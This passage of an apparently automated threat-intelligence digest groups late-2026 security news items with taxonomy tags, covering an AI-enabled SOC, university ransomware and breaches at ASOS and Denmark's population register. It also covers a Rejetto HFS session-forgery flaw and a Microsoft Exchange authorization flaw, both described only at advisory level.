  - Summary: Multihashing is one of those cryptographic tasks that’s easy not to think about too much. This is unfortunate, because multihashing is a common stumbling point when cryptographers try to use hashes. As part of our goal to “fix software, not bugs,” Trail of Bits is introducing SequenceHash and its sister function SequenceMAC , a pair of related hash constructions that bring secure multihashing to developers using hash functions other than Keccak. We hope SequenceHash and SequenceMAC will help cryptographers avoid attacks that take advantage of ambiguous input encodings. The specification is open source, and is now a part of the Community Cryptography Specification Project (C2SP). SequenceHash and SequenceMAC behave similarly to NIST’s TupleHash , but have the advantage of not being tied to a single hash function. They also don’t require developers to implement fiddly computations that aren’t byte-aligned. Instead, SequenceHash and SequenceMAC work out of the box with nearly any secure c

### Cluster 5dbe1bad04 — score 10

- Title: How AI Is Changing the Roles Required in the Security Operations Center
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-01T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/ai-changing-security-operations-center-roles-soc
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
As AI takes on more of the enrichment, correlation, and initial assessment inside the SOC, roles, skills, and KPIs still require deliberate redesign. Security leaders need to decide where automation is dependable, where human judgment should remain decisive, and how teams should be measured when alert handling is no longer the center of the operating model The Gartner® report, The Roles Required for the AI-Enabled Security Operations Center (SOC) , examines the roles and capabilities Gartner expects the SOC to require as AI becomes embedded in security operations. Rapid7 is offering complimentary access to the research, which we believe can help leaders plan their future workforce, operating model, and investment priorities. How will AI change the role of SOC analysts? Many analyst roles and performance measures remain closely tied to handling individual alerts. As organizations introduce AI SOC agents to support enrichment, correlation, and initial assessment, leaders may need to reco
```

#### Full body

```
Exposure Command How AI Is Changing the Roles Required in the Security Operations Center Rapid7 Oct 1, 2026 | Last updated on Oct 1, 2026 | 4 min read DOWNLOAD THE GARTNER REPORT How AI Is Changing the Roles Required in the Security Operations Center Table of contents How AI Is Changing the Roles Required in the Security Operations Center DOWNLOAD THE GARTNER REPORT Table of contents As AI takes on more of the enrichment, correlation, and initial assessment inside the SOC, roles, skills, and KPIs still require deliberate redesign. Security leaders need to decide where automation is dependable, where human judgment should remain decisive, and how teams should be measured when alert handling is no longer the center of the operating model The Gartner® report, The Roles Required for the AI-Enabled Security Operations Center (SOC) , examines the roles and capabilities Gartner expects the SOC to require as AI becomes embedded in security operations. Rapid7 is offering complimentary access to the research, which we believe can help leaders plan their future workforce, operating model, and investment priorities. How will AI change the role of SOC analysts? Many analyst roles and performance measures remain closely tied to handling individual alerts. As organizations introduce AI SOC agents to support enrichment, correlation, and initial assessment, leaders may need to reconsider where human expertise creates the greatest operational value. Gartner states, "Human analysts must transition from alert triage roles to end-to-end case ownership and effective response option communication." At Rapid7, we believe this shift creates an opportunity for analysts to focus their judgment on validating context, coordinating response, and communicating decisions clearly. Gartner also recommends, "Stop recording alert metrics and run the SOC on cases and decisions." Robert Willis, VP of Managed Detection and Response at Rapid7, puts it plainly: "Alert volume is a distraction. The real measure of SOC value is decision quality, did you get the right answer, fast enough to act on it? MDR is built to deliver exactly that: answers, not alerts, so your team can focus on ownership and response rather than triage." MDR can help manage alert volume while adding investigation and response capacity, giving internal teams more space to focus on the cases that require their context and ownership. Where does human judgment remain essential? Rapid7's experience applying agentic AI within our MDR SOC shows how this division of work can operate in practice. Our agentic workflows have saved more than 200 analyst hours each week and achieved 99.93% benign-disposition accuracy, reducing the repetitive work involved in initial triage and giving analysts more time for complex, ambiguous, and higher-stakes investigations. We believe human judgment remains essential when a decision carries operational consequences. AI can gather evidence, correlate activity, and present a structured rationale, while analysts validate the conclusion, consider the organization's priorities, and determine the appropriate response. This human-led, AI-driven model combines machine-speed investigation with accountable decision-making. Why are SOC engineering roles expected to expand? As AI-enabled workflows expand, engineering discipline is likely to become increasingly important within security operations. Reliable processes require people who understand threats and security data, can test automated workflows, and can establish appropriate controls around AI-supported decisions. The report includes the strategic planning assumption, "By 2028 there will be 50% more engineers in security operations teams than analysts." Gartner also advises organizations, "Redefine detection engineering role descriptions and hiring requirements. Expand them beyond rule writing to include prompt design, workflow testing, and AI output validation." From Rapid7's perspective, detection engineering is developing into
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: How AI Is Changing the Roles Required in the Security Operations Center
  - Published: 2026-10-01T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/ai-changing-security-operations-center-roles-soc
  - Summary: As AI takes on more of the enrichment, correlation, and initial assessment inside the SOC, roles, skills, and KPIs still require deliberate redesign. Security leaders need to decide where automation is dependable, where human judgment should remain decisive, and how teams should be measured when alert handling is no longer the center of the operating model The Gartner® report, The Roles Required for the AI-Enabled Security Operations Center (SOC) , examines the roles and capabilities Gartner expects the SOC to require as AI becomes embedded in security operations. Rapid7 is offering complimentary access to the research, which we believe can help leaders plan their future workforce, operating model, and investment priorities. How will AI change the role of SOC analysts? Many analyst roles and performance measures remain closely tied to handling individual alerts. As organizations introduce AI SOC agents to support enrichment, correlation, and initial assessment, leaders may need to reco

### Cluster 486a6d24f0 — score 10

- Title: Higher education is under siege, and fragmented security is making it harder to respond
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-30T14:16:37+00:00
- Link: https://www.rapid7.com/blog/post/it-higher-education-under-siege-fragmented-security
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- affected_industries: education, financial_services, government
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- affected_industries: financial_services, government, education
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Higher education faces a difficult security equation. Universities hold large volumes of sensitive student, financial, health, and research data while supporting open networks, distributed users, legacy infrastructure, and increasingly complex cloud environments. Attackers have taken notice, and the pressure on security teams continues to grow. In Q2 2025, universities faced an average of 4,388 cyberattacks per organization per week, up 24% from the same period in 2024. Nine in ten universities reported experiencing a breach or security incident during the previous 12 months, while the average cost of a data breach in education reached $10.22 million. Confirmed attacks against higher education institutions exposed more than 3.9 million records in 2025, with ransomware continuing to disrupt teaching, research, financial aid, and administrative operations. Those figures are concerning on their own, but they only explain part of the problem. For university systems with multiple campuses,
```

#### Full body

```
Government Higher education is under siege, and fragmented security is making it harder to respond Rapid7 Sep 30, 2026 | Last updated on Sep 30, 2026 | 5 min read MORE ON RAPID7 SLED Higher education is under siege, and fragmented security is making it harder to respond Table of contents Higher education is under siege, and fragmented security is making it harder to respond MORE ON RAPID7 SLED Table of contents Higher education faces a difficult security equation. Universities hold large volumes of sensitive student, financial, health, and research data while supporting open networks, distributed users, legacy infrastructure, and increasingly complex cloud environments. Attackers have taken notice, and the pressure on security teams continues to grow. In Q2 2025, universities faced an average of 4,388 cyberattacks per organization per week, up 24% from the same period in 2024. Nine in ten universities reported experiencing a breach or security incident during the previous 12 months, while the average cost of a data breach in education reached $10.22 million. Confirmed attacks against higher education institutions exposed more than 3.9 million records in 2025, with ransomware continuing to disrupt teaching, research, financial aid, and administrative operations. Those figures are concerning on their own, but they only explain part of the problem. For university systems with multiple campuses, the way security is organized can create an additional layer of risk. Why is higher education so difficult to secure? Universities operate differently from most commercial organizations. Open access, collaboration, and academic freedom are central to their mission, which means security teams must protect environments where students, faculty, researchers, guests, and third parties connect from almost anywhere. That openness sits alongside an unusually broad mix of sensitive data. A single university may hold student PII, financial aid and tax records, health information, proprietary research, government-funded projects, and intellectual property. Many institutions also rely on legacy systems that have been connected over time to modern cloud applications, APIs, learning platforms, and research networks, creating visibility gaps that can be difficult to manage. Resource pressure adds to the challenge. The draft cites 94% of higher education IT leaders as saying they lack enough personnel to defend their environments adequately, leaving relatively small teams responsible for sprawling networks with large numbers of users, devices, applications, and third-party services. Why multi-campus fragmentation increases cyber risk For multi-campus university systems, many of these pressures are compounded by decentralized security operations. Individual campuses often maintain their own infrastructure, security tools, teams, incident response processes, vendor relationships, and renewal cycles. The result can be limited visibility across the wider institution. If ransomware is detected at one campus, teams elsewhere may have no immediate view of the same attacker activity. If a zero-day is exploited in one research environment, another campus may remain exposed because the intelligence and response process stay local. Fragmentation also affects efficiency. When each campus independently buys, deploys, and manages its own security stack, the wider university system can carry duplicated costs, additional management overhead, and inconsistent coverage. Fragmentation can also slow the spread of threat intelligence across a university system. If one campus detects a new attack pattern, an unusual intrusion technique, or previously unseen malware, that insight may remain local rather than reaching security teams elsewhere in time to act. A suspicious login sequence identified at Campus B, for example, could be the early signal of activity already moving toward Campus A or Campus C, but without shared visibility each team may investigate the same threat indep
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Higher education is under siege, and fragmented security is making it harder to respond
  - Published: 2026-09-30T14:16:37+00:00
  - Link: https://www.rapid7.com/blog/post/it-higher-education-under-siege-fragmented-security
  - Summary: Higher education faces a difficult security equation. Universities hold large volumes of sensitive student, financial, health, and research data while supporting open networks, distributed users, legacy infrastructure, and increasingly complex cloud environments. Attackers have taken notice, and the pressure on security teams continues to grow. In Q2 2025, universities faced an average of 4,388 cyberattacks per organization per week, up 24% from the same period in 2024. Nine in ten universities reported experiencing a breach or security incident during the previous 12 months, while the average cost of a data breach in education reached $10.22 million. Confirmed attacks against higher education institutions exposed more than 3.9 million records in 2025, with ransomware continuing to disrupt teaching, research, financial aid, and administrative operations. Those figures are concerning on their own, but they only explain part of the problem. For university systems with multiple campuses,

### Cluster 90ba2c8775 — score 10

- Title: Osaka Metropolitan University cancels classes after suspected ransomware attack
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-10-06T14:52:00+00:00
- Link: https://therecord.media/osaka-university-cancels-classes-ransomware
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: financial_services, government, healthcare, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: healthcare, financial_services, government, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Osaka Metropolitan University said on Tuesday that the outage left its internal network, email and a range of administrative and academic systems unavailable.
```

#### Full body

```
Image: KishujiRapid via Wikimedia Commons (CC BY 4.0) Osaka Metropolitan University cancels classes after suspected ransomware attack One of Japan’s largest universities canceled classes and shut down a large part of its IT infrastructure following a suspected ransomware attack that began late last week. Osaka Metropolitan University said on Tuesday that the outage left its internal network, email and a range of administrative and academic systems unavailable. OMU said it believes ransomware caused the disruption and is investigating the attack with outside cybersecurity specialists. It has not identified the attackers or said whether it received a ransom demand. The outage affected systems used for academic administration, educational support, financial accounting, payroll, human resources and library services, as well as the university's websites and internal network. About 500 servers stopped operating following the attack, Japanese media reported , citing university officials at a press conference Monday. The reports said information belonging to at least 130,000 current and former students, faculty members and others associated with the university may have been exposed. The potentially affected information includes names, addresses and email addresses, as well as data linked to Osaka Prefecture University and Osaka City University, which merged in 2022 to form OMU. The university has not confirmed that personal data was stolen and said Tuesday that it was still investigating whether any information had been leaked. It has reported the incident to Japan's data protection authority and other government agencies. The disruption forced OMU to cancel classes through at least Thursday. The university said it plans to resume in-person classes Friday, while online classes will restart depending on the progress of system recovery. Systems used for entrance exam applications and enrollment procedures remain available because they are hosted on external servers, according to the university. The attack also did not affect the electronic medical record system at the university hospital, which continued providing medical services. Its veterinary clinical center also remained operational. The incident comes amid several recently disclosed cyber breaches in Japan, although there is no evidence that they are connected. Over the weekend, Japanese media giant Nikkei disclosed that a compromised employee account had been used to send roughly 9,000 malicious emails to internal and external contacts, including journalistic sources. Other Japanese companies that have recently disclosed cyber incidents include brokerage Daiwa Securities, delivery companies Yamato Transport and Sagawa Express, insurer Dai-ichi Life and broadcast equipment manufacturer Ikegami Tsushinki. Cybercrime News No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Osaka Metropolitan University cancels classes after suspected ransomware attack
  - Published: 2026-10-06T14:52:00+00:00
  - Link: https://therecord.media/osaka-university-cancels-classes-ransomware
  - Summary: Osaka Metropolitan University said on Tuesday that the outage left its internal network, email and a range of administrative and academic systems unavailable.

### Cluster afa4dde99a — score 10

- Title: ASOS confirms data breach after “HACKED” in-app notifications
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-06T16:33:54+00:00
- Link: https://www.bleepingcomputer.com/news/security/asos-confirms-data-breach-after-hacked-in-app-notifications/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: education
- affected_products: Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: education
- affected_products: Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
UK fashion retailer ASOS confirmed a data breach Tuesday after hackers sent unauthorized push notifications through its mobile app while claiming to have stolen customer data from the company's Snowflake environment. [...]
```

#### Full body

```
ASOS confirms data breach after “HACKED” in-app notifications By Lawrence Abrams October 6, 2026 12:33 PM 0 UK fashion retailer ASOS confirmed a data breach Tuesday after hackers sent unauthorized push notifications through its mobile app while claiming to have stolen customer data from the company's Snowflake environment. ASOS is a large UK-based online fashion retailer that sells clothing, footwear, accessories, and beauty products to customers worldwide, including in the United States. ASOS has confirmed that third-party platforms used to communicate with customers were accessed without authorization and says basic personal information, including names and contact details, may have been exposed. The company is now displaying an in-app notice telling customers to disregard the unauthorized push alert and not to click or engage with the external third-party link it contained. Warning about notification now shown in ASOS app However, the company has not confirmed the threat actor's claim that its Snowflake environment was compromised or disclosed how many customers may be affected. ASOS says it does not believe payment-card information or account passwords were impacted. If you have any information regarding this incident or other undisclosed attacks, you can contact us confidentially via Signal at 646-961-3731 or at tips@bleepingcomputer.com. Hackers abuse ASOS mobile app The notifications began appearing at approximately 5:00 a.m. ET on Tuesday, with multiple BleepingComputer readers contacting us after receiving the alerts on their phones. "ASOS HACKED," reads the notification seen by BleepingComputer. "Dear Asos DPO and IT, we have fully compromised the Snowflake instance. Engage with us, or we will leak it." "ASOS HACKED" notification sent via the official ASOS mobile app Source: Reddit Numerous other ASOS customers also reported receiving the same notification on Reddit, indicating that the message reached many, if not all, mobile app users. The notification directs ASOS to a Telegram channel operated by a threat actor calling itself the "Xuanye group." In messages posted to the channel Tuesday morning, the threat actor claimed the breach did not affect payment information. However, the attackers later published a "FINAL STATEMENT," claiming that they stole customer information in the attack. "The affected organisation's app is safe to use. The incident involves customer information, it is safe on our server, and it will not be touched for a designated period," reads the group's message. "Considering the current situation regarding incident disclosure in the cyber security landscape, you can thank us for our generous clarity regarding this incident." The group did not disclose what customer information was allegedly stolen, how many customers were impacted, or provide evidence showing that it had compromised ASOS's Snowflake environment. BleepingComputer attempted to contact the threat actors about the breach, but the only contact point required payment. We did not continue as it is against our editorial guidelines to pay for information. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Nikkei discloses breaches of employees’ Microsoft, Google email accounts Denmark population registry data breach affects 8.8 million people Frontline Education breach exposes school district employee data Hackers stole Pentagon personnel records of over 3 million people Metamask discloses security incident affecting its infrastructure
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: ASOS confirms data breach after “HACKED” in-app notifications
  - Published: 2026-10-06T16:33:54+00:00
  - Link: https://www.bleepingcomputer.com/news/security/asos-confirms-data-breach-after-hacked-in-app-notifications/
  - Summary: UK fashion retailer ASOS confirmed a data breach Tuesday after hackers sent unauthorized push notifications through its mobile app while claiming to have stolen customer data from the company's Snowflake environment. [...]

### Cluster 18981f1338 — score 10

- Title: Rejetto HFS servers now actively scanned for critical RCE flaw
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-05T20:20:05+00:00
- Link: https://www.bleepingcomputer.com/news/security/rejetto-hfs-servers-now-actively-scanned-for-critical-rce-flaw/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-61500

#### Cluster taxonomy (union across members)
- affected_industries: education, telecommunications
- affected_products: GitLab
- cve_ids: CVE-2026-61500
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: telecommunications, education
- affected_products: GitLab
- cve_ids: CVE-2026-61500
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers are actively scanning for a Rejetto HFS weak signing key vulnerability, tracked as CVE-2026-61500, that allows session forgery, account takeover, and remote code execution (RCE). [...]
```

#### Full body

```
Rejetto HFS servers now actively scanned for critical RCE flaw By Bill Toulas October 5, 2026 04:20 PM 0 Hackers are actively scanning for a Rejetto HFS weak signing key vulnerability, tracked as CVE-2026-61500, that allows session forgery, account takeover, and remote code execution (RCE). VulnCheck VP of Security Research Caitlin Condon posted on LinkedIn over the weekend that the company's Canary Intelligence honeypots had observed probes targeting CVE-2026-61500. Condon said the observed activity appears to be small-scale reconnaissance from a single China Telecom IP address probing deployments in Japan and the United States. Rejetto HFS (HTTP File Server) is a free and open-source file-sharing server tool used for self-hosted file sharing on Windows, Linux, and macOS. CVE-2026-61500, first published on July 13, 2026 , is a session-cookie signing weakness and leakage issue fixed in Rejetto HFS version 3.2.1. "Rejetto HFS 3.0.0 through 3.2.0 derives its session-cookie signing key from the non-cryptographic Math.random() generator and discloses outputs of the same generator to unauthenticated clients during login," reads the flaw description on the NIST NVD. "A remote attacker can collect a small number of login responses, reconstruct the generator's state, recover the signing key, and forge a valid administrator session cookie, leading to full administrative access and remote code execution via the server_code configuration feature." Horizon3 researchers discovered the flaw using Anthropic's Mythos model, which identified both the weak signing-key generation and the leak that enabled key recovery. Horizon3 published more details about the flaw and a proof-of-concept (PoC) exploit in a write-up on September 30, 2026. "Mythos didn't just flag the insecure PRNG in isolation – it simultaneously identified that the application leaked raw Math.random() outputs through a separate code path, recognized those two facts as a chain, and determined the leak produced exactly the observations needed to make state recovery feasible," explained Horizon3 . Recovering the session key Source: Horizon3 The researchers' exploit demonstrates the chain to abuse HFS's built-in ability to execute custom server-side JavaScript to achieve remote code execution. The release of these technical details may have prompted the probing activity targeting CVE-2026-61500. Possible attack scenarios include accessing, stealing, or deleting HFS files, installing malware on the server, or using the compromised host to access internal systems. However, VulnCheck has not shared details on successful exploitation or any post-exploitation activity. Users of Rejetto HFS are recommended to upgrade to version 3.2.1 or, ideally, the latest stable release, 3.3.4, as soon as possible. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Frontline Education breach exposes school district employee data GitLab warns of critical RCE vulnerability in AI Gateway service Dell asks admins to patch max severity CSM flaws as soon as possible Microsoft says threat actors are ahead in the early AI race Kiteworks patches max severity code injection vulnerability
```

#### Corroborating sources (2)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Rejetto HFS servers now actively scanned for critical RCE flaw
  - Published: 2026-10-05T20:20:05+00:00
  - Link: https://www.bleepingcomputer.com/news/security/rejetto-hfs-servers-now-actively-scanned-for-critical-rce-flaw/
  - Summary: Hackers are actively scanning for a Rejetto HFS weak signing key vulnerability, tracked as CVE-2026-61500, that allows session forgery, account takeover, and remote code execution (RCE). [...]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Target Rejetto HFS Flaw That Enables Admin Session Forgery and RCE
  - Published: 2026-10-05T08:09:23+00:00
  - Link: https://thehackernews.com/2026/10/attackers-target-rejetto-hfs-flaw-that.html
  - Summary: A critical security flaw impacting Rejetto HTTP File Server (HFS) is witnessing active exploitation attempts, according to VulnCheck. The vulnerability in question is CVE-2026-61500 (CVSS score: 9.3), a case of session forgery stemming from the use of a weak pseudo-random number generator (PRNG) that can lead to a predictable key, which an attacker can then use to gain unauthorized access and

### Cluster e1bd66f397 — score 10

- Title: 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-06T09:38:30+00:00
- Link: https://www.securityweek.com/8-8-million-impacted-by-data-breach-at-denmarks-central-person-register/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: critical_infrastructure, healthcare
- affected_products: Fortinet, Microsoft SharePoint, npm
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, data_breach, web_shell_backdoor, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: healthcare, critical_infrastructure
- affected_products: npm, Microsoft SharePoint, Fortinet
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers abused a company’s lawful access to the CPR system to steal the personal information of registered citizens. The post 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register appeared first on SecurityWeek .
```

#### Full body

```
Denmark’s Central Person Register (CPR) is notifying roughly 8.8 million people that their personal information was stolen in a data breach. Established in 1968, CPR is Denmark’s national civil registration system and contains information on about 11 million people, including residents, emigrants, and deceased individuals. On Monday, CPR announced that hackers used a Danish company’s lawful access to the system to exfiltrate people’s personal information. Under Danish law, private companies with a legitimate interest gain access to the CPR to obtain information on specific individuals. Companies may also request the information under the country’s Data Protection Regulation and Data Protection Act. The incident was discovered on Friday, when the population register was notified of abnormal behavior within its system during September. Over the weekend, the organization determined that hackers accessed the names, addresses, and CPR numbers (the equivalent of Social Security numbers) of approximately 8.8 million registered individuals, both living and deceased. Advertisement. Scroll to continue reading. The data breach does not affect individuals who chose to register with the name and address protection option, the national registrar says. After discovering the incident, CPR immediately terminated the private company’s access, notified the Danish Data Protection Agency, and launched an investigation with the police and other relevant authorities. The population register urges individuals to be wary of unsolicited communication requesting personal information, passwords, and other sensitive data. CPR said it would review its security policies and improve protections to prevent similar incidents. It also noted that it could not name the threat actor behind the data breach. Related: 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Related: Pentagon Personnel Agency Data Breach Impacts 3 Million People Related: DC Health Agency Exposes 400,000 Beneficiary Records Related: 23 Million User Records Compromised in Gyazo Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Exploitation Hits Rejetto HFS Vulnerability Discovered by AI Alleged ShinyHunters Leader Arrested in Jordan Fortra Patches Critical Vulnerabilities in BoKS In Rare Move, Alleged Iranian State Hacker Extradited to US Warlock Expands SharePoint Exploitation in Critical Infrastructure Attacks Exploited Fortinet FortiMail Zero-Day Calls for Urgent Action Zimbra Vulnerability Exploited in the Wild Prior to Public Disclosure Latest News FBI Blames Contractor’s Missed Patch for ShinyHunters Breach FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Apple to Tighten Full Disk Access Controls in macOS Amid AI Risks Cybersecurity M&A Roundup: 39 Deals Announced in September 2026 Long-Running NPM Malware Campaign Accumulates 40,000 Downloads Social Engineering Detection Moves Into the Live Conversation Google Narrows Open Source Bug Bounty Amid Wave of Invalid Automated Reports Linux Backdoor Abuses STUN Protocol, Exploits Dozens of Flaws Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Securing AI Agents, MCPs, and AI Automations October 7, 2026 Learn how to address potential risks and not restrict AI adoption in your organization. See what a centralized AI gateway is and how it works in practice. Register Virtual Event: Zero Trust & Identity Strategies Summit 2026 October 14, 2026 Join as we decipher the world of zero trust and share war stories on securing an organization by eliminating implicit trust and continuou
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register
  - Published: 2026-10-06T09:38:30+00:00
  - Link: https://www.securityweek.com/8-8-million-impacted-by-data-breach-at-denmarks-central-person-register/
  - Summary: Hackers abused a company’s lawful access to the CPR system to steal the personal information of registered citizens. The post 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register appeared first on SecurityWeek .

### Cluster c18e100563 — score 10

- Title: Microsoft Exchange Flaw Lets Authenticated Attackers Read Other Users' Mailboxes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-05T16:21:52+00:00
- Link: https://thehackernews.com/2026/10/microsoft-exchange-flaw-lets.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-96940

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, vulnerability_disclosure, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services
- affected_products: Android, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-88772, CVE-2026-96940
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, web_shell_backdoor, vulnerability_disclosure, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services
- affected_products: OpenAI/ChatGPT, GitLab, Android
- cve_ids: CVE-2026-96940, CVE-2026-88772
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft has released out-of-band security updates to address a high-severity flaw in Microsoft Exchange Server that could allow an attacker to escalate privileges under certain conditions. The vulnerability, tracked as CVE-2026-96940, is rated 8.8 on the CVSS scoring system. "Weak authorization in Microsoft Exchange Server allows an authenticated attacker to elevate privileges over a
```

#### Full body

```
Microsoft Exchange Flaw Lets Authenticated Attackers Read Other Users' Mailboxes  Ravie Lakshmanan  Oct 05, 2026 Vulnerability / Email Security Microsoft has released out-of-band security updates to address a high-severity flaw in Microsoft Exchange Server that could allow an attacker to escalate privileges under certain conditions. The vulnerability, tracked as CVE-2026-96940 , is rated 8.8 on the CVSS scoring system. "Weak authorization in Microsoft Exchange Server allows an authenticated attacker to elevate privileges over a network," Microsoft said in an advisory released on October 2, 2026. The Windows maker said an authenticated attacker can exploit this flaw to gain unauthorized access to other users' mailboxes within the same organization and read email messages and attachments. However, the vulnerability does not allow cross-tenant access. Microsoft has already deployed a "related service-side fix" to Exchange Online to address the issue. As a result, Exchange Online customers are not required to take any action. Users of affected on-premises Microsoft Exchange Server products are advised to install the updates to stay protected. The following versions are impacted - Microsoft Exchange Server Subscription Edition RTM Microsoft Exchange Server 2016 Cumulative Update 23 Microsoft Exchange Server 2019 Cumulative Update 15 Microsoft Exchange Server 2019 Cumulative Update 14 Redmond has credited Microsoft researcher Jan Mitchell with discovering and reporting the flaw. Although there is no evidence of the flaw being weaponized in the wild, Microsoft has tagged it with an Exploitability assessment of "Exploitation More Likely," making it essential that users move quickly to apply the fixes. The disclosure comes days after Broadcom-owned Symantec warned that the China-linked Warlock actor is exploiting multiple vulnerabilities in Microsoft SharePoint to deploy its namesake ransomware in attacks targeting organizations in Portuguese- and Spanish-speaking countries. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  email security , Microsoft , Vulnerability ⚡ Top Stories This Week ⚡ Weekly Recap: $387M Crypto Hack, Citrix Exploits, AI Agents Go Off-Script, and More Threats Carbonato Botnet Compromises Docker Hosts to Deploy Telegram-Controlled Hermes AI Agent RatHat Android Malware Console Uses Gemini to Identify Higher-Value Victims Apple Patches CoreGraphics Flaw Possibly Exploited in Targeted Attacks OpenAI Shelves GPT-6.1 Astra After Tests Find Deception and Unauthorized Actions Dutch Police Arrest 24-Year-Old Amsterdam Man in ShinyHunters Investigation New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses French Tax Data Theft Using Stolen Staff Passwords Went Undetected for Seven Weeks Citrix NetScaler CVE-2026-88772 Exploit Details Show Pre-Auth Path to Shellcode Execution OpenSSL Fixes High-Severity DTLS Flaw That Can Leak Heap Memory Unencrypted Cisco Warns of Attackers Exploiting Critical Authentication Bypass in SD-WAN Manager Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets Citrix NetScaler Post-Exploitation Payload Creates Superuser, Maps Web Shell to CSS-Like URLs Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path WordPress Backdoor Rebuilds Itself After Cleanup Using Files, Database, and Shared Memory ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers Critical FortiMail Zero-Day Flaw Exploited in Attacks 